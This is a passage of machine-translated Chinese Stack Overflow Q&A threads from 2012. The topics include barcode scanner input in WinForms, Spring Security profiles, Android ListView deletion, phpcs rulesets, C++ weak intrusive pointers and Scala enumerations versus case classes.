[在 WinForms 中区分条码扫描器和键盘](http://nicholas.piasecki.name/blog/2009/02/distinguishing-barcode-scanners-from-the-keyboard-in-winforms/)

看看这个线程。那里有你需要的一切。

如果您将使用此特定扫描仪，您可以将其设置为在输入结束时发送特定信号。要设置扫描枪，您需要阅读设备的文档，可能在制造商的网站上提供。

如果您将使用相同的扫描枪，[另一种解决方案。](http://www.codeproject.com/Articles/296533/Using-a-bar-code-scanner-in-NET)

如果您的客户将使用许多不同的扫描仪，那么设置每个人并跟踪他们的输入会有点困难。在这种情况下，您必须计算按键之间的时间（Windows 无法区分条形码扫描仪和普通键盘）。但是您仍然必须知道扫描仪发送的输入的后缀。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-03T13:36:25.930

符号或摩托罗拉 LS2208 是一款非常标准的条码扫描仪。 [RHLTechnologies.com 上的 LS2208](http://www.rjltechnologies.com/LS2208-SR20001R-NA-MOTOROLA-p/ls2208-sr20001r-na.htm)

但是，您正在做的问题不是扫描仪，它可能是您从与正在使用的条形码相关的基础接近整个应用程序的方式。如果需要从单个代码中收集多层信息也许使用二维条码可能会更好，也许是数据矩阵或类似的东西。

此外，解析将被简化，您可以使用符号/motorola adf 预先存在的库在应用程序之外通过编程条形码对扫描仪进行编程，或者您可以使用 Motorola Solutions 的扫描实用程序 123SCAN2。这意味着您的应用程序更加灵活，不受特定扫描仪的束缚，并且可以更灵活地使用所需的硬件，而不是依赖特定品牌或扫描仪。

问候，

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-02-03T05:34:19.827

您需要一个在扫描条形码后用于执行某种操作的解决方案。您想在条形码阅读器扫描条形码后做一些事情，对吗？那么这将帮助你更多。为用于扫描条形码的文本框编写 keyPress 事件。现在，如果您在那里编写任何代码，每次您从键盘按下任何键或每次条形码扫描仪读取字符时都会执行该代码。如果要在扫描条形码后执行某些代码，则需要在该 keyPress 事件中添加条件。条形码扫描仪具有与每次条形码扫描相关的返回字符 (\n)。所以你需要在 keyPress 事件中添加这个条件。以下是供您参考的代码。

```
public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
    }

    private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
    {
        if (e.KeyChar == (char)Keys.Return)
        {
            MessageBox.Show( textBox1.Text + " scanned...");
            //write your code here
        }

    }
} 
```

# objective-c - 按下主页按钮时进行服务器调用

> ID：13343460
> 
> 赞同：0
> 
> 时间：2012-11-12T12:08:20.830
> 
> 标签：objective-c, ios

我正在开发一个iOS应用程序，当按下主页按钮时我需要进行服务器调用......我一直在阅读，我知道当用户按下该按钮时会调用几个方法，但我'我真的不确定应用程序是否有足够的时间拨打电话......

这是我在考虑添加服务器调用的地方......

```
- (void)applicationDidEnterBackground:(UIApplication *)application{

} 
```

我有足够的时间打电话吗？只是一个消息，我不需要回复或类似的东西......

如果不可能，您认为完成这项工作的最佳选择是什么？任何想法？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:18:00.823

只要应用程序进入后台，您在该方法中输入的任何内容都会立即执行。你为什么不测试一下？您没有办法知道请求已发送到服务器吗？

由于服务器响应后您无需执行任何操作，包括在您提到的应用程序委托方法中发出请求的代码应该做您所追求的。

# nagios - Nagios/Check_MK：如何查看有效的对象定义

> ID：13343468
> 
> 赞同：1
> 
> 时间：2012-11-12T12:09:01.327
> 
> 标签：nagios, check-mk

在 Nagios（或 check_mk）中，有没有办法查看在所有模板、继承等之后的最终有效对象（例如主机）定义是什么？

我想将其用作测试/调试工具，以确保我的定义按预期结束，并相互比较配置。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T06:30:54.067

Nagios 安装中应该有一个“status.dat”文件（通常是 [Nagios_install]/var/status.dat），其中包含所有已定义检查的“扁平化”列表。

您的主要 nagios.cfg 文件应位于以下位置：

```
Format:     status_file=<file_name>
Example:    status_file=/usr/local/nagios/var/status.dat 
```

还有这个文件：

```
Format:     object_cache_file=<file_name>
Example:    object_cache_file=/usr/local/nagios/var/objects.cache 
```

希望这可以帮助。

# spring - 在 3.0.x 版本中禁用 Spring 方法安全性

> ID：13343469
> 
> 赞同：6
> 
> 时间：2012-11-12T12:09:14.043
> 
> 标签：spring, security, spring-security, spring-3

我有一个配置了 Spring Security 的 Web 应用程序来限制对 URL 和方法的访问。我想在默认情况下完全禁用它，并允许我的客户根据需要轻松打开它（他们只能访问“spring-security.xml”）。

我设法关闭了 URL 拦截，但我的方法安全性仍然启用......

有什么线索吗？

（我不想让客户更改我的 web.xml，所以很遗憾每次都修改“global-method-security”设置不是一个选项...）

这是我更新的 spring-security.xml 配置：

```
<http auto-config='true' use-expressions="true">
    <intercept-url pattern="/**" access="permitAll" />
    <http-basic />
    <anonymous />
</http> 
```

我已经像这样覆盖了 DelegatingFilterProxy.doFilter 方法：

```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
    final String springSecured = System.getProperty("springSecured");

    if (StringUtils.isNotBlank(springSecured) && springSecured.equalsIgnoreCase("true")) {
        // Call the delegate
        super.doFilter(request, response, filterChain);
    } else {
        // Ignore the DelegatingProxyFilter delegate
        filterChain.doFilter(request, response);
    }
} 
```

这是我拥有的方法安全性的一个示例：

```
@RequestMapping(
        value = "applications/{applicationName}/timeout/{timeout}",
        method = RequestMethod.POST)
public
@ResponseBody
@PreAuthorize("isFullyAuthenticated() and hasPermission(#authGroups, 'deploy')")
Object deployApplication() {
    // ...
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:18:22.377

如果我是你，我不会使用自定义过滤器链实现，只是开箱即用。您可以使用嵌套元素启用和禁用 bean 配置部分（自 Spring 3.0 起），因此这样的操作可能很方便：

```
<beans profile="secure">
    <http auto-config='true' use-expressions="true">...</http>
</beans> 
```

您的应用程序现在在默认配置文件（以及除“安全”配置文件之外的任何其他配置文件）中不受保护。您可以通过提供系统属性 spring.profiles.active=secure 或通过在上下文或 servlet 初始化程序中显式设置来启用安全配置文件。

# iphone - 如何在通用 App 内的多个设备之间共享数据以保持 App 同步？

> ID：13343470
> 
> 赞同：0
> 
> 时间：2012-11-12T12:09:22.327
> 
> 标签：iphone, ios, game-center, icloud, sharing

我制作了一个支持游戏中心的应用程序。用户可以玩一定数量的关卡，每个关卡都可以获得分数。通过使用充满字典的数组来保存分数，其中包含每轮分数的信息。

因为这个游戏正在使用游戏中心，所以如果用户使用多个设备使用相同的游戏中心 ID 玩游戏，我真的希望让我的游戏保持同步。我怎样才能实现这一点，以便拥有一个实时的“游戏更新器”来在多个设备之间共享每个级别的分数？

游戏中心会带来这样的功能吗？有没有办法通过 iCloud 推送数据？还是我应该考虑使用一个后端服务器来保存和加载每个级别和每个用户的分数？

跟进 tkanzakic 他的回答：

我找到了这个帮助类来同步我所有的 NSUserdefaults 数据[链接](http://blog.mugunthkumar.com/coding/ios-code-mkicloudsync-sync-your-nsuserdefaults-to-icloud-with-a-single-line-of-code/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:20:04.057

我没有玩过 Game Center，所以我不知道您是否可以在多个设备之间共享信息，但肯定可以使用 iCloud。如果您将此信息存储在用户的默认值中，它将通过此​​服务自动共享，请检查此[http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/UserDefaults/StoringPreferenceDatainiCloud/StoringPreferenceDatainiCloud.html](http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/UserDefaults/StoringPreferenceDatainiCloud/StoringPreferenceDatainiCloud.html)

# android - 如何从数据库和列表视图中删除所选项目

> ID：13343475
> 
> 赞同：0
> 
> 时间：2012-11-12T12:09:35.617
> 
> 标签：android, android-sqlite

我想从列表视图和数据库中删除选定的项目。我为列表视图和数据库插入编写了代码。

但问题是删除我正在使用 OnItemClick 侦听器删除特定项目。

对于删除项目，我将 Position 变量传递给数据库删除方法。它可以工作，但是当您删除列表的上部项目而不是尝试删除下部项目时，它不会删除。

可能是因为我将位置变量传递给数据库删除方法。在数据库中我用主键 ID 检查它，并且在删除上项后下项的 ID 没有改变，所以会出现这个问题

建议我一些好的解决方案

这是代码片段代码

```
 public void onStart() {
   super.onStart();
   initfrag();}
private void initfrag() {
// TODO Auto-generated method stub
    dh = new com.myapp.database.DatabaseHelper(getActivity());
    nameArray   =   new  ArrayList<String>();
    db = new com.myapp.database.DatabaseHelper(getActivity());
    list = (ListView)getView().findViewById(R.id.fevlist);
    adapter=new ListAdapter(getActivity(), nameArray);
    Log.d("Reading: ", "Reading all contacts..");
     List<Fevorites> contacts = db.getAllContacts();     
     for (Fevorites cn : contacts) {
         s = "Name: " + cn.getID() + " ,Phone: " + cn.getPhoneNumber()+"\n";
         nameArray.add(s);
         list.setAdapter(adapter);     
             }
    list.setAdapter(adapter);
      list.setOnItemClickListener(new OnItemClickListener() {
          public void onItemClick(AdapterView adapterView, View view, int position, long id) {
        // TODO Auto-generated method stu   
         nameArray.remove(position);
         Toast t = Toast.makeText(getActivity(), nameArray.get(position), Toast.LENGTH_SHORT);
         t.show();
        // dh.Deleteitem();
            adapter.notifyDataSetChanged();
            adapter=new ListAdapter(getActivity(), nameArray);
         list.setAdapter(adapter);

    }
}); 
} 
```

这里是Fevorites

```
public class Fevorites {
//private variables
int _id;
String _name;
String _phone_number;
// Empty constructor
public Fevorites(){
}
// constructor
public Fevorites(int id, String name, String _phone_number){
    this._id = id;
    this._name = name;
    this._phone_number = _phone_number;
}
// constructor
public Fevorites(String name, String _phone_number){
    this._name = name;
    this._phone_number = _phone_number;
}
// getting ID
public int getID(){
    return this._id;
}
// setting id
public void setID(int id){
    this._id = id;
}
// getting name
public String getName(){
    return this._name;
}
// setting name
public void setName(String name){
    this._name = name;
}

// getting phone number
public String getPhoneNumber(){
    return this._phone_number;
}

// setting phone number
public void setPhoneNumber(String phone_number){
    this._phone_number = phone_number;
} 
```

}

数据库助手类

```
public DatabaseHelper(Context context) {
    super(context,DATABASE_NAME , null,DATABASE_VERSION);
    // TODO Auto-generated constructor stub
}
@Override
public void onCreate(SQLiteDatabase db) {
    // TODO Auto-generated method stub

    String CREATE_CONTACTS_TABLE = "CREATE TABLE " + TABLE_CONTACTS + "("
            + KEY_ID + " INTEGER PRIMARY KEY," + KEY_ARTIST + " TEXT,"
            + KEY_SONG + " TEXT" + ")";
    db.execSQL(CREATE_CONTACTS_TABLE);
}
public void addContact( ) {
    SQLiteDatabase db = this.getWritableDatabase();
    ContentValues values = new ContentValues();
    values.put(KEY_ARTIST, "XYZ  "); // Contact Name
    values.put(KEY_SONG, "XYZ testing "); // Contact Phone
    // Inserting Row
    db.insert(TABLE_CONTACTS, null, values);
    db.close(); // Closing database connection
}
public void Deleteitem(String string)
        {
    SQLiteDatabase db = this.getWritableDatabase();
    String query = "DELETE FROM favorite WHERE id="+string;
    db.execSQL(query);
        }
 // Getting All Contacts
public List<Fevorites> getAllContacts() {
    List<Fevorites> contactList = new ArrayList<Fevorites>();
    // Select All Query
    String selectQuery = "SELECT  * FROM " + TABLE_CONTACTS;
    SQLiteDatabase db = this.getWritableDatabase();
    Cursor cursor = db.rawQuery(selectQuery, null);
    // looping through all rows and adding to list
    if (cursor.moveToFirst()) {
        do {
            Fevorites contact = new Fevorites();
            contact.setID(Integer.parseInt(cursor.getString(0)));
            contact.setName(cursor.getString(1));
            contact.setPhoneNumber(cursor.getString(2));
            // Adding contact to list
            contactList.add(contact);
        } while (cursor.moveToNext());
    }
    // return contact list
    return contactList;
}
Fevorites getContact(int id) {
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor cursor = db.query(TABLE_CONTACTS, new String[] { KEY_ID,
            KEY_SONG, KEY_ARTIST }, KEY_ID + "=?",
            new String[] { String.valueOf(id) }, null, null, null, null);
    if (cursor != null)
        cursor.moveToFirst();
    Fevorites contact = new Fevorites(Integer.parseInt(cursor.getString(0)),
            cursor.getString(1), cursor.getString(2));
    // return contact
    return contact;
}
@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    // TODO Auto-generated method stub
} 
```

这是自定义列表适配器类

**列出适配器类 **

```
public class ListAdapter extends BaseAdapter {
private Activity activity;
private ArrayList<String> name;
private static LayoutInflater inflater=null;

public ListAdapter(Activity a, ArrayList<String> nameArray) {
    activity = a;
    name    =   nameArray;
    inflater = (LayoutInflater)activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
}
public int getCount() {
    return name.size();
}
public Object getItem(int position) {
    return position;
}
public long getItemId(int position) {
    return position;
}
public static class ViewHolder{
    public TextView text;
}
public View getView(int position, View convertView, ViewGroup parent) {
    View vi=convertView;
    ViewHolder holder;
    if(convertView==null){
        vi = inflater.inflate(R.layout.fevorites_list, null);
        holder=new ViewHolder();
        holder.text=(TextView)vi.findViewById(R.id.list_item_entry_title);
        vi.setTag(holder);
    }
    else
        holder=(ViewHolder)vi.getTag();
    holder.text.setText(name.get(position));
    return vi;
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T13:30:48.753

通常，您检索`List`某种对象（假设在您的情况下：**收藏夹列表**），然后将其传递给您`adapter`以在 a 中显示它`ListView`。所以你`CustomAdapter`会是这样的：

```
public class ListAdapter extends BaseAdapter {
private Context context;
private ArrayList<Favorites> items;
private LayoutInflater inflater=null;

public ListAdapter(Context context, ArrayList<Favorites> items) {
    this.context = context;
    this.items   =   items;
    inflater = LayoutInflater.from(context);
}
public int getCount() {
    return items.size();
}
public Favorites getItem(int position) {
    return items.get(position);
}
public long getItemId(int position) {
    return items.get(position).getId();
}
public static class ViewHolder{
    public TextView text;
}
public View getView(int position, View convertView, ViewGroup parent) {
    View vi=convertView;
    ViewHolder holder;
    if(convertView==null){
        vi = inflater.inflate(R.layout.fevorites_list, parent, false);
        holder=new ViewHolder();
        holder.text=(TextView)vi.findViewById(R.id.list_item_entry_title);
        vi.setTag(holder);
    }
    else 
         holder=(ViewHolder)vi.getTag();

    holder.text.setText(items.get(position).getName());
    return vi;

   }
 } 
```

然后，实例化适配器并将其传递给您的 listView，如下所示：

```
//retreive the list of contacts
List<Fevorites> contacts = db.getAllContacts(); 
ListAdapter adapter = new ListAdapter(ActivityName.this , contacts);
list.setAdapter(adapter); 
```

**注意：用`ActivityName`您的活动名称替换**

# apache - Apache POI - Word 文件

> ID：13343479
> 
> 赞同：2
> 
> 时间：2012-11-12T12:09:50.233
> 
> 标签：apache, ms-word, format, apache-poi

1.  我已经成功地能够读取包含使用 POI 的图像的 word 文档。
2.  我什至可以从 Word 文档中提取一个部分，包括图像。
3.  我正在将提取的包含图像的部分写入一个新的 word 文档。
4.  我的问题是我必须使用任何标准的 Java Swing 组件在屏幕上显示这个提取的部分（包含文本、字体、颜色图像）。

请告知我该怎么做？

我尝试了 JText、Panel、编辑器，但都只使用文本，我失去了格式和图像。

问候

# php - 如果可以，我可以覆盖每个文件使用的 phpcs 规则集吗？

> ID：13343480
> 
> 赞同：6
> 
> 时间：2012-11-12T12:09:49.937
> 
> 标签：php, codesniffer

最近我们迁移到 git 并在我们的中央服务器上实现（现在发布）接收钩子以向开发人员发送报告，并制作了一些工具，使我们能够在我们的开发环境中使用 phpcs 自动检查我们的代码标准。

这一切都很好，很好，运作良好，但我们希望能够始终依赖我们的代码标准，而不是忽略每个出于逻辑原因不符合要求的文件。现在，我们有自己的规则集，它覆盖了默认 PEAR 标准中的一些内容，但如果可能的话，我们希望更进一步。

我们的问题是，虽然 PEAR 标准非常适合所有类/业务逻辑，但在视图文件中，我们希望放宽规则，比如右括号需要在自己的行中。问题是我们主要在这些文件中定义 html，我们仅有的控制结构是简单的 if-else 或 foreach 语句，打开 php，然后添加换行符，右括号，换行符，关闭 php 有点傻 imo。

必需的语法是有效的：

```
<?php
}
// end of some if statement ?> 
```

我们希望将其用于视图：

```
<?php } // end of some if statement ?> 
```

这将使我们的代码更具可读性......

我们不喜欢 wel ( `if(..): ... endif;`) 等替代语法，afaik 主要是因为这里的有效性也存在一些问题（都是关于空格的......）。

忽略整个文件（带有`// @codingStandardsIgnoreFile`）不是我们的选择。

**tl;博士**

所以我们想做的是为我们的视图文件定义一个单独的规则集，这样我们仍然有一个标准要遵守，但在这些方面有宽松的规则，所以我们的代码仍然可以阅读。

我对 phpcs 还不太了解，并且我自己也找不到任何使用关键字的解决方案，我认为这是合乎逻辑的......也欢迎任何关于制作也符合 PEAR 的整洁视图文件的建议......

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T21:47:02.293

如果归结为您想从某些文件中排除几条消息，那么您可以将这些排除直接放入您的 ruleset.xml 文件中。例如：

```
<!--
  You can also be more specific and just exclude some messages.
  Please note that all message-specific ignore patterns are
  checked using absolute paths.

  The code here will just hide the ContainsVar error generated by the
  Squiz DoubleQuoteUsage sniff for files that match either of the two
  exclude patterns.
 -->
<rule ref="Squiz.Strings.DoubleQuoteUsage.ContainsVar">
  <exclude-pattern>*/tests/*</exclude-pattern>
  <exclude-pattern>*/data/*</exclude-pattern>
</rule> 
```

我不确定您的视图文件存储在哪里，但如果您可以使用排除模式（基本上只是一个正则表达式）匹配它们，那么您将能够放宽它们的一些规则。

找出 ref="" 位的最佳方法是在视图文件上运行 phpcs 并使用`-s`命令行参数。对于每条消息，您将获得一个唯一代码，然后您可以使用该代码将特定的排除模式添加到您的规则集中。

您还可以在规则集文件中执行许多其他操作。[在这里查看文档。](https://github.com/squizlabs/PHP_CodeSniffer/wiki/Annotated-ruleset.xml)

# android - Android expandablelistview展开时无法显示最后一组

> ID：13343483
> 
> 赞同：6
> 
> 时间：2012-11-12T12:09:56.147
> 
> 标签：android, android-layout, android-listview, android-webview, expandablelistview

我正在尝试在我的项目中实现一个常见问题解答屏幕，并且我想使用 ExpandableListView。我在 GroupView 中将问题显示为文本，在 ChildView 中将答案显示为文本。如果项目可以放入屏幕，则没有问题，它应该可以正常工作。但是当项目超过屏幕高度并且我必须滚动时，就会出现这个问题，即当我展开最后一个项目时，它的行为就像它已展开但我无法滚动到子视图。

关于这个问题有什么想法或经验吗？

这是屏幕截图（如您所见，滚动条显示它已展开并且有滚动的地方，但是当我尝试滚动时，没有运气）：

![党卫军](../Images/b2684a19eaf60b5b84174309a12bd8a3.png)

**编辑：**我发现这个问题是因为我在子行内使用 WebView，当我切换到 TextView 时，它按预期工作。如何使用 WebView 实现相同的结果？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-21T12:42:24.673

在 BaseExpandableListAdapter 的 getGroupView() 方法中，将 view=null 作为方法的第一行。

# spam - 如何阻止 ad.fly 链接到我的域？

> ID：13343490
> 
> 赞同：1
> 
> 时间：2012-11-12T12:10:37.280
> 
> 标签：spam

我看到很多从 ad.fly 到我网站的传入链接。我假设有人正在使用他们的服务链接到我的域以通过插页式广告赚钱。

[http://imgur.com/dZrem](http://imgur.com/dZrem)

我正在寻找一种方法来阻止 ad.fly 链接到我的网站。我认为这是不可能的，因为他们可能只是在自己的一端创建一个短链接。

因此，解决方法是我想阻止来自 ad.fly 的所有传入请求。这可以做到吗？

该网站正在运行一个 vBulletin 论坛，并由 LAMP 服务器提供支持。

# c++ - oF：错误 C2039：“_Dynamic_tag”：不是“std::tr1”的成员

> ID：13343492
> 
> 赞同：1
> 
> 时间：2012-11-12T12:10:44.083
> 
> 标签：c++, openframeworks

我刚刚开始使用 openFrameworks 并且正在使用 0072 Visual Studio 版本。当我尝试构建 oF 提供给我的空示例项目时，它只给了我这个错误：

错误 C2039：“_Dynamic_tag”：不是“std::tr1”的成员

我正在使用 Visual Studio 2012 Express，似乎这个问题已经解决了，但是在 VS2010 版本中，[这里](https://github.com/openframeworks/openFrameworks/pull/1341).

我用已解决的检查了 ofTypes.h 并没有区别。

任何的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:13:48.940

我的理解是 VS2012`std::tr1::`完全支持在`std::`.

如果不出意外，看起来 OFW 正在使用内部的实现变量（前导下划线是一个线索），这是一件非常愚蠢的事情。

这意味着[OpenFrameWorks 需要另一个更新](http://forum.openframeworks.cc/index.php?topic=10758.0)。

# java - 无法创建新文件：设备尚未准备好

> ID：13343502
> 
> 赞同：5
> 
> 时间：2012-11-12T12:11:31.583
> 
> 标签：java, file, file-io

我正在使用 Java 创建一个新文件，但出现异常：

```
Exception in thread "main" java.io.IOException: The device is not ready
at java.io.WinNTFileSystem.createFileExclusively(Native Method)
at java.io.File.createNewFile(File.java:947)
at pdfconverter.PdfConverter.main(PdfConverter.java:96) 
```

Java 结果：1

在我的第 96 行是这个条件：

```
if (!logfile.exists()) {
        logfile.createNewFile();//line 96
    } 
```

我以前使用过这个 amny 时间，但我不明白发生了什么因为我以管理员身份登录。请帮忙。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-12T14:00:03.490

问题是路径，因为有人将驱动器号从 F 重命名为 D，所以找不到路径。很抱歉没有及时注意到。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2018-10-08T20:00:30.533

如果您在部署应用程序时在您的 net-beans 中发生此类错误，请打开此路径`C:\Program Files\Apache Software Foundation\Apache Tomcat 8.0.3\conf\Catalina\localhost`（它可能与您的 tomcat 安装目录不同）。有 web.xml 你应该打开它并检查`docBase="D:\xyz\web\target\web"`是否由正确的项目基目录配置。

# ssas - 事实表中的时间度量 (SSAS)

> ID：13343505
> 
> 赞同：1
> 
> 时间：2012-11-12T12:11:49.043
> 
> 标签：ssas, aggregation, measure

我在 SQL Server 2008 R2 中有一个数据类型为 time(7) 的时间度量，但在 ssas 中，此类型更改为 WChar。这个度量代表 Persens 的进出时间，我想对其进行聚合（总和）和进出的平均值。

有人可以建议怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T17:45:34.693

将字段转换为 etl 中的 int / seconds。以 int 形式存储在您的多维数据集中（您可能想要隐藏它）。

在 ssas 中为平均值等创建计算度量。您还可以使用计算度量方法转换回对用户更友好的小时或分钟。

# android - NFC 手机能否充当 RFID 标签，可以在 4 英寸以上的距离读取？

> ID：13343507
> 
> 赞同：24
> 
> 时间：2012-11-12T12:11:50.510
> 
> 标签：android, nfc, rfid

更具体地说，我正在尝试实现一个 Android 应用程序，它强制手机作为 RFID 标签运行。该标签由放置在门周围的扫描仪读取（因此限制 > 4 英寸），识别人员及其下落。

手机将充当智能标签，从而提供更多用例。

谢谢你。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-11-13T20:45:24.197

大多数支持 NFC 的 Android 手机模拟卡的能力都很低。手机中使用的 NXP 芯片以及 android 内核都支持卡仿真。但是，高级 Android API 很可能不会公开这些功能，因为此类功能存在一些明显的安全问题。为了能够读取现有卡并对其进行仿真，可以轻松复制门禁卡和其他 RFID/NFC 标签，甚至一些智能卡。使用合适的设备已经可以做到这一点，但将这种能力交给每个拥有 Android 手机的人可能会扰乱整个行业。例如，所有物理门禁系统都依赖于可以通过使用安卓手机轻松复制的卡。我认为这个功能不存在，因为启用它会在多个行业引起巨大的不安。

您可以看到内核支持卡模拟（这是*Google Wallet Tap & Pay*用来让您将手机用于所有信用卡等的功能）：

```
git clone https://android.googlesource.com/platform/external/libnfc-nxp 
```

如果您进行低级“黑客攻击”，则可以访问这些功能。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-11-12T12:22:28.597

NFC 尤其限于 4 英寸的距离。由于近场通信被视为两个合作伙伴之间的“经批准的通信”，因此它并非旨在用作诸如 RFID 之类的跟踪设备，例如在商店中使用。

因此，您可以将 NFC 用作 RFID 设备，但手机中的硬件仍将距离限制在 4 英寸。

// 编辑

您可以改为使用新的蓝牙 4.0 协议。通信伙伴之间的建立时间与 NFC 一样快（<0.1 秒）（相比之下，蓝牙 2.1 几乎高达 6 秒）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:21:06.210

要增加RFID阅读器的阅读距离，就需要增加他的功率。

虽然这在技术上是可行的，但大多数国家已经（根据法律）将 RFID 阅读器的最大功率设置为 1 W。

我的猜测是您手机的 NFC 已经在 1 W 下运行，并且您无法以编程方式强制它在上面运行。

# c++ - 在 C++ 中实现弱侵入式指针

> ID：13343511
> 
> 赞同：11
> 
> 时间：2012-11-12T12:12:18.497
> 
> 标签：c++, smart-pointers, weak-references

> 弱指针类似于智能指针，只是来自弱指针的引用不会阻止垃圾回收，并且弱指针在使用之前必须检查其有效性。

在我们的项目（Linderdaum Engine [http://www.linderdaum.com](http://www.linderdaum.com)）中，我们使用了侵入式指针。为了避免循环引用和孤立岛，我们通过以下方式实现了弱侵入指针：

```
namespace LPtr
{
    clPtr<iObject> GetObjectsGraphPtrWrapper( sEnvironment* Env, iObject* Obj, size_t Generation );
};

/// Intrusive weak smart pointer
template <class T> class clWeakPtr
{
public:
    /// default constructor
    clWeakPtr(): Env( NULL ), FObject( NULL ), FGeneration( 0 ) {}
    explicit clWeakPtr( T* Ptr )
     : Env( Ptr ? Ptr->Env : NULL )
     , FObject( Ptr )
     , FGeneration( Ptr ? Ptr->FGeneration : 0 ) {}
    explicit clWeakPtr( const clPtr<T>& Ptr )
     : Env( Ptr ? Ptr->Env : NULL )
     , FObject( Ptr.GetInternalPtr() )
     , FGeneration( Ptr ? Ptr->FGeneration : 0 ) {}
    clPtr<T> Lock() const
    {
        clPtr<iObject> P = LPtr::GetObjectsGraphPtrWrapper( Env, FObject, FGeneration );

        return P.DynamicCast<T>();
    }
private:
    sEnvironment* Env;
    T*            FObject;
    size_t        FGeneration;
}; 
```

`GetObjectsGraphPtrWrapper`在这里只是为了前向声明，大致这样做：

```
LMutex Lock( &FObjectsGraphMutex );

clObjectsGraph::const_iterator i = std::find( Env->ObjectsGraph.begin(), Env->ObjectsGraph.end(), Obj );

if ( i == Env->ObjectsGraph.end() ) return clPtr<iObject>();

bool IsSame  = Obj->FGeneration == Generation;
bool IsAlive = Obj->GetReferenceCounter() > 0;

return  ( IsSame && IsAlive ) ? clPtr<iObject>( Obj ) : clPtr<iObject>(); 
```

`Generation`在的范围内是全局的，`sEnvironment`并且每次实例化一个新对象时都是原子增量的。

**我的问题是：**

1）像这样实现弱引用是否安全？

2）有什么方法可以优化`clWeakPtr::Lock()`吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T20:35:55.383

1）看起来确实很安全，但是对图表的任何修改都会与`LPtr::GetObjectsGraphPtrWrapper`

2）读写锁可能会有所帮助，至少您可以`Lock()`并行调用多个

您的解决方案的问题在于它破坏了非侵入式弱指针带来的局部性。根据并发级别，它可能会成为一个问题，因为每次调用`Lock()`都会阻止任何对象创建以及任何其他`Lock()`没有读写锁的调用。

# scala - Scala - 枚举与案例类

> ID：13343513
> 
> 赞同：13
> 
> 时间：2012-11-12T12:12:20.723
> 
> 标签：scala, enums, akka, actor, case-class

我创建了名为 LogActor 的 akka 演员。LogActor 的接收方法处理来自其他参与者的消息并将它们记录到指定的日志级别。

我可以通过两种方式区分不同的级别。第一个：

```
import LogLevel._
object LogLevel extends Enumeration {
    type LogLevel = Value
    val Error, Warning, Info, Debug = Value
}
case class LogMessage(level : LogLevel, msg : String) 
```

第二个：（**编辑**）

```
abstract class LogMessage(msg : String)
case class LogMessageError(msg : String) extends LogMessage(msg)
case class LogMessageWarning(msg : String) extends LogMessage(msg)
case class LogMessageInfo(msg : String) extends LogMessage(msg)
case class LogMessageDebug(msg : String) extends LogMessage(msg) 
```

哪种方式更有效？匹配案例类或匹配枚举值是否需要更少的时间？

（我读[了这个](https://stackoverflow.com/questions/1898932/case-classes-vs-enumerations-in-scala)问题，但没有任何关于运行时问题的答案）

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-12T16:50:21.397

我完全同意 Alexey 和 Dennis 的观点，即这种情况下的性能不应该打扰您，因为这更多是编译器优化的问题，而不是开发人员，而且我无法想象性能差异会变得明显的场景。

应该困扰您的是您的代码一致性，从这个意义上说，您应该根据您的决定是要坚持使用第一个示例中正确描述的枚举的旧 java-ish 方法，还是最近流行的**代数数据类型**(ADT) 模式。后者你试图在你的第二个例子中表示，但有一些错误。

以下是如何使用 ADT 模式正确解决问题。

### ADT 解决方案 #1

```
// 1\. marked `sealed` to make pattern matching exhaustive
// 2\. used a trait to avoid double storage of msg` and 
//    make the inheritance easier
sealed trait LogMessage { def msg : String }
// A better solution for isolation than names like "LogMessageError".
// Allows you to either address the members with a namespace like 
// "LogMessage.Error" or do "import LogMessage._" and address them 
// directly
object LogMessage { 
  case class Error (msg : String) extends LogMessage
  case class Warning (msg : String) extends LogMessage
  case class Info (msg : String) extends LogMessage
  case class Debug (msg : String) extends LogMessage
} 
```

### ADT 解决方案 #2

很抱歉可能弄乱了你的脑袋，但值得注意的是，对于类似的情况，还有一种替代的 ADT 方法，这有点类似于你使用枚举的方法。

```
sealed trait LogLevel 
object LogLevel {
  case object Error extends LogLevel
  case object Warning extends LogLevel
  case object Info extends LogLevel
  case object Debug extends LogLevel
}
case class LogMessage ( level : LogLevel, msg : String ) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-11-12T13:29:56.690

“不要过早优化”适用。与您将消息传递给您的演员或实际记录它们所花费的时间相比，我认为它们之间的差异根本不重要。但我希望最好的性能是创建一个 Java `enum`（可以从 Scala 轻松访问和使用）来代替 Scala 来记录日志级别`Enumeration`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T13:45:04.523

记录器最常见的操作之一是将当前记录级别与消息级别进行比较，使用枚举可以免费获得它，而使用案例类的设置会有些麻烦。我同意@AlexeyRomanov：匹配不应该是这里的瓶颈。

